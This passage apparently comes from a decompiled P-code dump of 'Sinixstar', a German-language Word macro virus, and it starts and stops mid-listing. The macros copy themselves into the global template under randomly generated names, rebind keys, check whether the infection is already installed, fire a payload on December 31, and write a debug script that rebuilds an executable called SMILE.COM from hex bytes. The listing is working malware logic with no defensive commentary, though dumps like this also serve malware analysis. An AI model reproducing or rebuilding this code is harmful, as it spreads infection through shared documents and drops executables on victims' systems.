' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #105:
' 	Ld c$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #106:
' 	Ld c$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #107:
' 	Ld c$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #108:
' 	Ld c$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #109:
' 	Ld c$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #110:
' 	Ld c$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #111:
' 	Ld c$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #112:
' 	Ld c$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #113:
' 	Ld c$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #114:
' Line #115:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #116:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #117:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #118:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #119:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #120:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #121:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #122:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #123:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #124:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #125:
' Line #126:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #127:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #128:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #129:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #130:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #131:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #132:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #133:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #134:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #135:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #136:
' Line #137:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #138:
' 	EndFunc 
' Line #139:
' 	Reparse 0x004E "=============================================================================="
' Line #140:
' 	Reparse 0x0027 "Macro name: Sinixstar2 [SINIXSTAR2] "U""
' Line #141:
' 	Reparse 0x004E "------------------------------------------------------------------------------"
' Line #142:
' 	FuncDefn (Sub MAIN())
' Line #143:
' 	OnError Finish 
' Line #144:
' Line #145:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #146:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #147:
' Line #148:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St CO$ 
' Line #149:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St OC$ 
' Line #150:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St OCO$ 
' Line #151:
' Line #152:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #153:
' 	GoTo Finish 
' Line #154:
' 	ElseBlock 
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	LitDI2 0x0001 
' 	Ld DateiSpeichernUnter 
' 	MemSt Format$ 
' Line #157:
' 	ArgsCall Run1 0x0000 
' Line #158:
' 	ArgsCall Run2 0x0000 
' Line #159:
' 	ArgsCall RunPayload 0x0000 
' Line #160:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall DateiAllesSpeichern 0x0002 
' Line #161:
' 	EndIfBlock 
' Line #162:
' Line #163:
' 	Label Finish 
' Line #164:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #165:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #166:
' 	GoTo Finito 
' Line #167:
' 	ElseBlock 
' Line #168:
' 	LitStr 0x0001 "a"
' 	ArgsCall Einfügen 0x0001 
' Line #169:
' 	EndIfBlock 
' Line #170:
' Line #171:
' 	Label Finito 
' Line #172:
' 	ArgsLd Jetzt 0x0000 
' 	ArgsLd Monat 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Jetzt 0x0000 
' 	ArgsLd Tag 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #173:
' 	GoTo Payload 
' Line #174:
' 	ElseBlock 
' Line #175:
' 	GoTo No 
' Line #176:
' 	EndIfBlock 
' Line #177:
' Line #178:
' 	Label Payload 
' Line #179:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St AK$ 
' Line #180:
' 	Reparse 0x0056 "ExtrasMakro.Name = AK$, .Ausführen, .Anzeigen = 0, .Beschreibung = "", .NeuerName = """
' Line #181:
' Line #182:
' 	Label No 
' Line #183:
' 	EndSub 
' Line #184:
' Line #185:
' 	FuncDefn (Sub Run1())
' Line #186:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #187:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #188:
' Line #189:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #190:
' Line #191:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St CO$ 
' Line #192:
' 	LitStr 0x0007 "Global:"
' 	Ld CO$ 
' 	Add 
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #193:
' 	LitStr 0x0007 "VirName"
' 	Ld Z$ 
' 	ArgsCall DokumentVariableBestimmen 0x0002 
' Line #194:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 1"
' Line #195:
' 	EndSub 
' Line #196:
' Line #197:
' 	FuncDefn (Sub Run2())
' Line #198:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #199:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #200:
' Line #201:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #202:
' Line #203:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St OC$ 
' Line #204:
' 	LitStr 0x0007 "Global:"
' 	Ld OC$ 
' 	Add 
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #205:
' 	LitStr 0x000A "VirNameDoc"
' 	Ld Z$ 
' 	ArgsCall DokumentVariableBestimmen 0x0002 
' Line #206:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 1"
' Line #207:
' 	EndSub 
' Line #208:
' Line #209:
' 	FuncDefn (Sub RunPayload())
' Line #210:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #211:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #212:
' Line #213:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #214:
' Line #215:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St OCO$ 
' Line #216:
' 	LitStr 0x0007 "Global:"
' 	Ld OCO$ 
' 	Add 
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #217:
' 	LitStr 0x000E "VirNamePayload"
' 	Ld Z$ 
' 	ArgsCall DokumentVariableBestimmen 0x0002 
' Line #218:
' 	EndSub 
' Line #219:
' Line #220:
' 	FuncDefn (Function VInstalled())
' Line #221:
' 	OnError (Resume Next) 
' Line #222:
' 	LitStr 0x000A "VirNameDoc"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St CC$ 
' Line #223:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #224:
' 	LitDI2 0x0001 
' 	ArgsLd ZählenMakros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #225:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd ZählenMakros 0x0001 
' 	For 
' Line #226:
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd MakroName$ 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #227:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #228:
' 	EndIfBlock 
' Line #229:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	EndFunc 
' Line #232:
' Line #233:
' 	FuncDefn (Function Fun(False, G, H, J))
' Line #234:
' 	LitDI2 0x0491 
' 	St One 
' Line #235:
' 	LitDI2 0x244E 
' 	St Two 
' Line #236:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	FnInt 
' 	St Num 
' Line #237:
' 	Ld Num 
' 	ArgsLd Str$ 0x0001 
' 	St a$ 
' Line #238:
' 	Ld a$ 
' 	ArgsLd LTrim$ 0x0001 
' 	St a$ 
' Line #239:
' Line #240:
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B$ 
' Line #241:
' 	Ld a$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St c$ 
' Line #242:
' 	Ld a$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St D$ 
' Line #243:
' 	Ld a$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St E$ 
' Line #244:
' Line #245:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #246:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #247:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #248:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #249:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #250:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #251:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #252:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #253:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #254:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #255:
' Line #256:
' 	Ld c$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #257:
' 	Ld c$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #258:
' 	Ld c$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #259:
' 	Ld c$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #260:
' 	Ld c$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #261:
' 	Ld c$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #262:
' 	Ld c$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #263:
' 	Ld c$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #264:
' 	Ld c$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #265:
' 	Ld c$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #266:
' Line #267:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #268:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #269:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #270:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #271:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #272:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #273:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #274:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #275:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #276:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #277:
' Line #278:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #279:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #280:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #281:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #282:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #283:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #284:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #285:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #286:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #287:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #288:
' Line #289:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #290:
' 	EndFunc 
' Line #291:
' 	Reparse 0x004E "=============================================================================="
' Line #292:
' 	Reparse 0x0027 "Macro name: Sinixstar3 [SINIXSTAR3] "U""
' Line #293:
' 	Reparse 0x004E "------------------------------------------------------------------------------"
' Line #294:
' 	FuncDefn (Sub MAIN())
' Line #295:
' Line #296:
' 	Reparse 0x0032 "DateiNeu.DokVorlage = "Normal", .DokVorlageNeu = 1"
' Line #297:
' 	ArgsCall DokumentMaximieren 0x0000 
' Line #298:
' 	LitDI2 0x0010 
' 	ArgsCall Schriftgrad 0x0001 
' Line #299:
' 	ArgsCall Fett 0x0000 
' Line #300:
' 	LitStr 0x0005 "Arial"
' 	ArgsCall Schriftart 0x0001 
' Line #301:
' 	LitStr 0x002B "Thanks for beta testing the Sinixstar virus"
' 	ArgsCall Einfügen 0x0001 
' Line #302:
' Line #303:
' 	ArgsLd Jetzt 0x0000 
' 	ArgsLd Sekunde 0x0001 
' 	St n 
' Line #304:
' 	Ld n 
' 	LitDI2 0x0003 
' 	Add 
' 	St m 
' Line #305:
' 	Label Again 
' Line #306:
' 	Ld n 
' 	Ld m 
' 	Ne 
' 	While 
' Line #307:
' 	ArgsLd Jetzt 0x0000 
' 	ArgsLd Sekunde 0x0001 
' 	St n 
' Line #308:
' 	GoTo Again 
' Line #309:
' 	Wend 
' Line #310:
' Line #311:
' 	OnError Finish 
' Line #312:
' Line #313:
' 	LitStr 0x0009 "Installed"
' 	LitStr 0x0003 "Yes"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St a$ 
' Line #314:
' Line #315:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #316:
' Line #317:
' 	LitStr 0x0008 "AutoOpen"
' 	ArgsLd MakroDateiName$ 0x0001 
' 	St a$ 
' Line #318:
' 	Ld a$ 
' 	LitDI2 0x0005 
' 	ArgsLd DateiNameInfo$ 0x0002 
' 	St B$ 
' Line #319:
' Line #320:
' 	Ld B$ 
' 	LitStr 0x0009 "power.scr"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "N SMILE.COM"
' 	PrintItemNL 
' Line #322:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 4D 5A F3 01 0C 00 00 00 20 00 81 00 FF FF 60 01"
' 	PrintItemNL 
' Line #323:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 00 08 00 00 1E 00 00 00 3E 00 00 00 01 00 FB 50"
' 	PrintItemNL 
' Line #324:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #326:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #331:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #332:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #333:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #336:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #337:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #338:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #339:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #340:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #341:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #342:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #343:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #344:
' 	LitDI2 0x0001 
